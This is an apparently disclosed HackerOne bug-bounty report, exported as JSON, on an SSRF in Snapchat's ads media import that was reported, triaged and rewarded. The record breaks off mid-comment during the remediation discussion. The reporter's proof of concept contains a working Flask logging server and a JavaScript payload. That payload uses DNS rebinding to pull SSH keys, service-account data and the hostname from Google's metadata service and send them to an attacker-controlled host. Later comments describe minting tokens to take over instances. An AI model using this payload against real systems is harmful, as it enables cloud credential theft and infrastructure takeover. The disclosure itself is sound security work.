{"id":530974,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MzA5NzQ=","url":"https://hackerone.com/reports/530974","title":"Server-Side Request Forgery using Javascript allows to exfill data from Google Metadata","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2019-04-08T05:29:28.539Z","submitted_at":"2019-04-08T05:29:28.539Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"nahamsec","url":"/nahamsec","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":513,"url":"https://hackerone.com/snapchat","handle":"snapchat","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/513/87067c5c4ed63c2c07a522ca3198d2310e2a14c6_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/513/87067c5c4ed63c2c07a522ca3198d2310e2a14c6_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Snapchat","twitter_handle":"","website":"https://www.snapchat.com/","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-11-30T18:27:26.494Z","bug_reporter_agreed_on_going_public_at":"2020-11-30T18:27:26.432Z","team_member_agreed_on_going_public_at":"2020-11-30T13:37:24.599Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hey there, \nI was looking at your ads site with @daeken, we found some weird behavior in the import function of the creative app. Here are the steps:\n\n#POC\n- Login to https://business.snapchat.com/\n- Go to creative library -\u003e New Creative \n- Under \"Topsnap Media\", click on \"Create\"\n- Click on any of the templates and load it\n- Click on one of the images in the template -\u003e Replace -\u003e Import\n- _This is where the SSRF exists_. Where you fetch images for your creative (`/api/v1/media/import`)\n-  Run this somewhere publicly accessible:\n\n```\nfrom flask import Flask, request\nfrom flask_cors import CORS\nfrom time import sleep\n\napp = Flask(__name__)\nCORS(app)\n\nimport logging\nlog = logging.getLogger('werkzeug')\nlog.setLevel(logging.ERROR)\n\n@app.route(\"/\")\ndef helloWorld():\n        sleep(3)\n        return 'hi!'\n\n@app.route('/log')\ndef log():\n        print request.args['msg']\n        return ''\n\napp.run(host='0.0.0.0')\n```\n\n- Put this on another domain you control. Change demon.██████████ to the host where you put this html file, and change ssh.████ to the host you're running the timing script (above) on.\n\n```\n\u003cscript\u003e\nvar logTimeServer = 'ssh.█████';\nvar attackServer = 'demon.██████';\n\nfunction log(data) {\n    var sreq = new XMLHttpRequest();\n    sreq.open('GET', 'http://' + logTimeServer + ':5000/log?msg=' + encodeURI(data), true);\n    sreq.send();\n}\n\nfunction get(url) {\n    try {\n        var req = new XMLHttpRequest();\n        req.open('GET', url, false);\n        req.setRequestHeader('X-Google-Metadata-Request', 'True');\n        req.send(null);\n        if(req.status == 200)\n            return req.responseText;\n        else\n            return '[failed status=' + req.status + ']';\n    } catch(err) {\n        log(err);\n    }\n    return null;\n}\n\nlog('Triggered in ' + window.location.href);\n\nfor(var i = 0; i \u003c 60; ++i) {\n    log('Loop ' + i);\n    var req = new XMLHttpRequest();\n    req.open('GET', 'http://' + logTimeServer + ':5000/', false);\n    req.send();\n}\nlog('SSH Keys: ' + get('http://' + attackServer + '/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json'));\nlog('Service Accounts: ' + get('http://' + attackServer + '/computeMetadata/v1/instance/service-accounts/?recursive=true\u0026alt=json'));\nlog('Hostname: ' + get('http://' + attackServer + '/computeMetadata/v1/instance/hostname'));\n\u003c/script\u003e\n```\n\n- Now hit `/api/v1/media/import` on `ads.snapchat.com`, with the URL parameter http://demon.███████/ssrf.html (or wherever you run it)\n- Immediately after requesting `ssrf.html`, switch the DNS on the domain to point to 169.254.169.254, and wait 3 minutes.  ssrf.html needs to be running on port 80, that way when the DNS changes, it starts talking to the metadata service.\n\n## Impact\n\n#SSH Keys:\n\n```\nSSH Keys: \"██████\"\n```\n\n#Hostname: \n`█████████`","vulnerability_information_html":"\u003cp\u003eHey there, \u003cbr\u003e\nI was looking at your ads site with \u003ca href=\"/daeken\"\u003e@daeken\u003c/a\u003e, we found some weird behavior in the import function of the creative app. Here are the steps:\u003c/p\u003e\n\n\u003ch1 id=\"poc\"\u003ePOC\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003eLogin to \u003ca title=\"https://business.snapchat.com/\" href=\"/redirect?url=https%3A%2F%2Fbusiness.snapchat.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://business.snapchat.com/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eGo to creative library -\u0026gt; New Creative \u003c/li\u003e\n\u003cli\u003eUnder \u0026quot;Topsnap Media\u0026quot;, click on \u0026quot;Create\u0026quot;\u003c/li\u003e\n\u003cli\u003eClick on any of the templates and load it\u003c/li\u003e\n\u003cli\u003eClick on one of the images in the template -\u0026gt; Replace -\u0026gt; Import\u003c/li\u003e\n\u003cli\u003e\n\u003cu\u003eThis is where the SSRF exists\u003c/u\u003e. Where you fetch images for your creative (\u003ccode\u003e/api/v1/media/import\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003e Run this somewhere publicly accessible:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003efrom flask import Flask, request\nfrom flask_cors import CORS\nfrom time import sleep\n\napp = Flask(__name__)\nCORS(app)\n\nimport logging\nlog = logging.getLogger(\u0026#39;werkzeug\u0026#39;)\nlog.setLevel(logging.ERROR)\n\n@app.route(\u0026quot;/\u0026quot;)\ndef helloWorld():\n        sleep(3)\n        return \u0026#39;hi!\u0026#39;\n\n@app.route(\u0026#39;/log\u0026#39;)\ndef log():\n        print request.args[\u0026#39;msg\u0026#39;]\n        return \u0026#39;\u0026#39;\n\napp.run(host=\u0026#39;0.0.0.0\u0026#39;)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003ePut this on another domain you control. Change demon.██████████ to the host where you put this html file, and change ssh.████ to the host you\u0026#39;re running the timing script (above) on.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;script\u0026gt;\nvar logTimeServer = \u0026#39;ssh.█████\u0026#39;;\nvar attackServer = \u0026#39;demon.██████\u0026#39;;\n\nfunction log(data) {\n    var sreq = new XMLHttpRequest();\n    sreq.open(\u0026#39;GET\u0026#39;, \u0026#39;http://\u0026#39; + logTimeServer + \u0026#39;:5000/log?msg=\u0026#39; + encodeURI(data), true);\n    sreq.send();\n}\n\nfunction get(url) {\n    try {\n        var req = new XMLHttpRequest();\n        req.open(\u0026#39;GET\u0026#39;, url, false);\n        req.setRequestHeader(\u0026#39;X-Google-Metadata-Request\u0026#39;, \u0026#39;True\u0026#39;);\n        req.send(null);\n        if(req.status == 200)\n            return req.responseText;\n        else\n            return \u0026#39;[failed status=\u0026#39; + req.status + \u0026#39;]\u0026#39;;\n    } catch(err) {\n        log(err);\n    }\n    return null;\n}\n\nlog(\u0026#39;Triggered in \u0026#39; + window.location.href);\n\nfor(var i = 0; i \u0026lt; 60; ++i) {\n    log(\u0026#39;Loop \u0026#39; + i);\n    var req = new XMLHttpRequest();\n    req.open(\u0026#39;GET\u0026#39;, \u0026#39;http://\u0026#39; + logTimeServer + \u0026#39;:5000/\u0026#39;, false);\n    req.send();\n}\nlog(\u0026#39;SSH Keys: \u0026#39; + get(\u0026#39;http://\u0026#39; + attackServer + \u0026#39;/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json\u0026#39;));\nlog(\u0026#39;Service Accounts: \u0026#39; + get(\u0026#39;http://\u0026#39; + attackServer + \u0026#39;/computeMetadata/v1/instance/service-accounts/?recursive=true\u0026amp;alt=json\u0026#39;));\nlog(\u0026#39;Hostname: \u0026#39; + get(\u0026#39;http://\u0026#39; + attackServer + \u0026#39;/computeMetadata/v1/instance/hostname\u0026#39;));\n\u0026lt;/script\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eNow hit \u003ccode\u003e/api/v1/media/import\u003c/code\u003e on \u003ccode\u003eads.snapchat.com\u003c/code\u003e, with the URL parameter \u003ca title=\"http://demon.xn--4zhaaaaaa/ssrf.html\" href=\"/redirect?url=http%3A%2F%2Fdemon.xn--4zhaaaaaa%2Fssrf.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://demon.xn--4zhaaaaaa/ssrf.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e (or wherever you run it)\u003c/li\u003e\n\u003cli\u003eImmediately after requesting \u003ccode\u003essrf.html\u003c/code\u003e, switch the DNS on the domain to point to 169.254.169.254, and wait 3 minutes.  ssrf.html needs to be running on port 80, that way when the DNS changes, it starts talking to the metadata service.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003ch1 id=\"ssh-keys\"\u003eSSH Keys:\u003c/h1\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eSSH Keys: \u0026quot;██████\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"hostname\"\u003eHostname:\u003c/h1\u003e\n\n\u003cp\u003e\u003ccode\u003e█████████\u003c/code\u003e\u003c/p\u003e\n","bounty_amount":"4000.0","formatted_bounty":"$4,000","weakness":{"id":68,"name":"Server-Side Request Forgery (SSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":268,"voters":["lowtoe","honoki","al-madjus","milly","daviey","sw33tlie","nytr0gen","sultancad","m0chan","kapytein","and 258 more..."],"structured_scope":{"databaseId":11824,"asset_type":"URL","asset_identifier":"snappublisher.snapchat.com","max_severity":"high"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":4504405,"is_internal":false,"editable":false,"type":"Activities::ReportCollaboratorInvited","message":null,"markdown_message":"","automated_response":false,"created_at":"2019-04-08T05:29:42.947Z","updated_at":"2019-04-08T05:29:42.947Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"email":"daeken","genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4504406,"is_internal":false,"editable":false,"type":"Activities::ReportCollaboratorJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-08T05:30:42.765Z","updated_at":"2019-04-08T05:30:42.765Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4504407,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"One key thing to note: the domain name you're using as the bait-and-switch (demon.█████████ in the PoC) must have its TTL set as low as possible.  I tested with 2 minutes, but if you can't bring it that low, adjust the Python script accordingly.  The value passed to `sleep()` essentially gives you how many minutes to wait before it starts making requests to the metadata service.","markdown_message":"\u003cp\u003eOne key thing to note: the domain name you\u0026#39;re using as the bait-and-switch (demon.█████████ in the PoC) must have its TTL set as low as possible.  I tested with 2 minutes, but if you can\u0026#39;t bring it that low, adjust the Python script accordingly.  The value passed to \u003ccode\u003esleep()\u003c/code\u003e essentially gives you how many minutes to wait before it starts making requests to the metadata service.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-08T05:31:56.464Z","updated_at":"2020-11-17T08:32:09.479Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4504411,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"And one other little note.  Because of the fact that it's making requests to the same domain (and presumably same host, according to normal logic!) it's possible to set the X-Google-Metadata-Request header.  This enables full access to the Google Metadata Service.","markdown_message":"\u003cp\u003eAnd one other little note.  Because of the fact that it\u0026#39;s making requests to the same domain (and presumably same host, according to normal logic!) it\u0026#39;s possible to set the X-Google-Metadata-Request header.  This enables full access to the Google Metadata Service.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-08T05:34:48.523Z","updated_at":"2019-04-08T05:34:48.523Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509342,"is_internal":false,"editable":false,"type":"Activities::ReportCollaboratorInvited","message":null,"markdown_message":"","automated_response":false,"created_at":"2019-04-08T16:38:43.069Z","updated_at":"2019-04-08T16:38:43.069Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"email":"ziot","genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509356,"is_internal":false,"editable":false,"type":"Activities::ReportCollaboratorJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-08T16:39:55.101Z","updated_at":"2019-04-08T16:39:55.101Z","actor":{"username":"ziot","cleared":true,"url":"/ziot","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/262/0ae404c47a4859c97158707b8e111baf9f6193d0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4510167,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks for your report! We are currently looking into this and will keep you updated with our progress.","markdown_message":"\u003cp\u003eThanks for your report! We are currently looking into this and will keep you updated with our progress.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-08T18:33:21.103Z","updated_at":"2019-04-08T18:33:21.103Z","actor":{"username":"winston","cleared":false,"url":"/winston","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4520777,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @winston - I have a stored XSS on this same app but it's blocked by CSP. Do you care to fix it?","markdown_message":"\u003cp\u003eHey \u003ca href=\"/winston\"\u003e@winston\u003c/a\u003e - I have a stored XSS on this same app but it\u0026#39;s blocked by CSP. Do you care to fix it?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-09T18:34:42.940Z","updated_at":"2019-04-09T18:34:42.940Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4532932,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks @nahamsec would you mind filing that in a separate H1 ticket? Thanks so much! For this report we're working on a fix and assessing impact simultaneously.","markdown_message":"\u003cp\u003eThanks \u003ca href=\"/nahamsec\"\u003e@nahamsec\u003c/a\u003e would you mind filing that in a separate H1 ticket? Thanks so much! For this report we\u0026#39;re working on a fix and assessing impact simultaneously.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-10T21:08:24.092Z","updated_at":"2019-04-10T21:13:15.441Z","actor":{"username":"winston","cleared":false,"url":"/winston","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4542486,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"During some investigation of the Google Metadata API, I noticed that it's possible to pull an authorization token, which can then be used to insert SSH keys, start/stop instances, and more.  Given this, it is at *least* possible to take over the scraper boxes, and possibly more of your infrastructure.\n\nDue to the impact, we didn't want to experiment on your machines, of course; this was done on my own GCP instance.  If you'd like, we can work with you to build a test plan that lets us safely prove this in your environment, but we don't want to overstep in any capacity.","markdown_message":"\u003cp\u003eDuring some investigation of the Google Metadata API, I noticed that it\u0026#39;s possible to pull an authorization token, which can then be used to insert SSH keys, start/stop instances, and more.  Given this, it is at \u003cem\u003eleast\u003c/em\u003e possible to take over the scraper boxes, and possibly more of your infrastructure.\u003c/p\u003e\n\n\u003cp\u003eDue to the impact, we didn\u0026#39;t want to experiment on your machines, of course; this was done on my own GCP instance.  If you\u0026#39;d like, we can work with you to build a test plan that lets us safely prove this in your environment, but we don\u0026#39;t want to overstep in any capacity.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-11T19:48:21.542Z","updated_at":"2019-04-11T19:48:21.542Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4542519,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks @daeken, we've actually been investigating the full impact of that vector specifically. On the topic of minting tokens in the production network I'd ask you to hold off on doing so. We appreciate the caution while testing this, always feel free to ask additional questions here if you're unsure about any specific testing. We've compiled a list of IAM permissions that instance has (as well as the limiting instance scopes at play) and will use them to determine the impact for reward here.\n\nAdditionally just as a status update we're working to get this fixed as soon as possible. We have some delays due to engineering availability as well as some complexity around remediating thing in a \"non-hacky\" fashion. This case specifically is a bit more challenging to holistically remediate due to the headless browser usage. ","markdown_message":"\u003cp\u003eThanks \u003ca href=\"/daeken\"\u003e@daeken\u003c/a\u003e, we\u0026#39;ve actually been investigating the full impact of that vector specifically. On the topic of minting tokens in the production network I\u0026#39;d ask you to hold off on doing so. We appreciate the caution while testing this, always feel free to ask additional questions here if you\u0026#39;re unsure about any specific testing. We\u0026#39;ve compiled a list of IAM permissions that instance has (as well as the limiting instance scopes at play) and will use them to determine the impact for reward here.\u003c/p\u003e\n\n\u003cp\u003eAdditionally just as a status update we\u0026#39;re working to get this fixed as soon as possible. We have some delays due to engineering availability as well as some complexity around remediating thing in a \u0026quot;non-hacky\u0026quot; fashion. This case specifically is a bit more challenging to holistically remediate due to the headless browser usage. \u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-11T19:57:37.385Z","updated_at":"2019-04-11T19:57:37.385Z","actor":{"username":"mbryant2","cleared":false,"url":"/mbryant2","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/qbxzNbNcbsuVA18eTfJr8zVZ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4542641,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Great, thanks for the update. Please let us know if we can assist in any way! For what it's worth, a good first pass here might just be blocking 169.254.169.254 from the instance (there may be an IPv6 address as well). That won't fix the underlying SSRF of course, but from the perspective of preventing token access and such, that will go a long way. Anyway, thanks again for the update and good luck with the remediation! We're here to support in any way we can.","markdown_message":"\u003cp\u003eGreat, thanks for the update. Please let us know if we can assist in any way! For what it\u0026#39;s worth, a good first pass here might just be blocking 169.254.169.254 from the instance (there may be an IPv6 address as well). That won\u0026#39;t fix the underlying SSRF of course, but from the perspective of preventing token access and such, that will go a long way. Anyway, thanks again for the update and good luck with the remediation! We\u0026#39;re here to support in any way we can.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-11T20:02:42.317Z","updated_at":"2019-04-11T20:02:42.317Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4578831,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Just following up on this since it's been a bit. The remediation is taking a bit longer due to some really unfortunate Chromium/Chrome behavior. We've got a path forward for holistic remediation but it will take a bit to add in properly.\n\nAdditionally, just to give a heads up we've investigated the IAM permissions and scopes of the instance token for these instances as well. The overall access that these tokens have is far from ideal but isn't as critical as we previously thought. This is why we're taking the time to do a proper fix for the underlying issue as opposed to issuing a \"quick hack\" to fix it. I'll look into possibly sharing the full details of that report here as well, since it's probably valuable information on how to determine the impact of these vulnerabilities. As I'm sure you're aware Server-side Request Forgery is one of the most nuanced and painful vulnerability classes to remediate so we want to make sure we fix it in a solid way.\n\nHope that gives a little bit of transparency on where we are at.","markdown_message":"\u003cp\u003eJust following up on this since it\u0026#39;s been a bit. The remediation is taking a bit longer due to some really unfortunate Chromium/Chrome behavior. We\u0026#39;ve got a path forward for holistic remediation but it will take a bit to add in properly.\u003c/p\u003e\n\n\u003cp\u003eAdditionally, just to give a heads up we\u0026#39;ve investigated the IAM permissions and scopes of the instance token for these instances as well. The overall access that these tokens have is far from ideal but isn\u0026#39;t as critical as we previously thought. This is why we\u0026#39;re taking the time to do a proper fix for the underlying issue as opposed to issuing a \u0026quot;quick hack\u0026quot; to fix it. I\u0026#39;ll look into possibly sharing the full details of that report here as well, since it\u0026#39;s probably valuable information on how to determine the impact of these vulnerabilities. As I\u0026#39;m sure you\u0026#39;re aware Server-side Request Forgery is one of the most nuanced and painful vulnerability classes to remediate so we want to make sure we fix it in a solid way.\u003c/p\u003e\n\n\u003cp\u003eHope that gives a little bit of transparency on where we are at.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-16T22:44:57.329Z","updated_at":"2019-04-16T22:44:57.329Z","actor":{"username":"mbryant2","cleared":false,"url":"/mbryant2","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/qbxzNbNcbsuVA18eTfJr8zVZ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4578905,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey Matthew,\n\nI appreciate the transparency here and I look forward to your report. I'd love to know what kinda impact this gets. This was technically my first time looking at Snapchat's core apps, so I'm happy we were able to identify something to keep you and the team busy :P \n\nLet me know how how I can help! ","markdown_message":"\u003cp\u003eHey Matthew,\u003c/p\u003e\n\n\u003cp\u003eI appreciate the transparency here and I look forward to your report. I\u0026#39;d love to know what kinda impact this gets. This was technically my first time looking at Snapchat\u0026#39;s core apps, so I\u0026#39;m happy we were able to identify something to keep you and the team busy :P \u003c/p\u003e\n\n\u003cp\u003eLet me know how how I can help! \u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-16T23:11:19.415Z","updated_at":"2019-04-16T23:11:19.415Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4638052,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @nahamsec, we are still working on figuring out the impact for this. Sorry that it's taking longer than usual to reward a bounty. ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/nahamsec\"\u003e@nahamsec\u003c/a\u003e, we are still working on figuring out the impact for this. Sorry that it\u0026#39;s taking longer than usual to reward a bounty. \u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-24T23:44:01.932Z","updated_at":"2019-04-24T23:44:01.932Z","actor":{"username":"divya","cleared":false,"url":"/divya","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4638056,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@divya - All good! I appreciate the regular updates :) Out of curiosity, do you know where this lands with CVSS?","markdown_message":"\u003cp\u003e\u003ca href=\"/divya\"\u003e@divya\u003c/a\u003e - All good! I appreciate the regular updates :) Out of curiosity, do you know where this lands with CVSS?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-24T23:45:36.606Z","updated_at":"2019-04-24T23:45:36.606Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4664587,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi all,\n\nJust checking in on this. Is there anything we can help with?","markdown_message":"\u003cp\u003eHi all,\u003c/p\u003e\n\n\u003cp\u003eJust checking in on this. Is there anything we can help with?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-29T18:08:48.784Z","updated_at":"2019-04-29T18:08:48.784Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4691123,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @nahamsec, thanks for your patience on this - we're still working on remediation.\n\nAdditionally, due to some of the complexities of the relationship between service account access scopes and IAM permissions we're consulting with the Google Cloud team to understand the full impact here (which is taking a bit).\n\nSorry for the wait!","markdown_message":"\u003cp\u003eHey \u003ca href=\"/nahamsec\"\u003e@nahamsec\u003c/a\u003e, thanks for your patience on this - we\u0026#39;re still working on remediation.\u003c/p\u003e\n\n\u003cp\u003eAdditionally, due to some of the complexities of the relationship between service account access scopes and IAM permissions we\u0026#39;re consulting with the Google Cloud team to understand the full impact here (which is taking a bit).\u003c/p\u003e\n\n\u003cp\u003eSorry for the 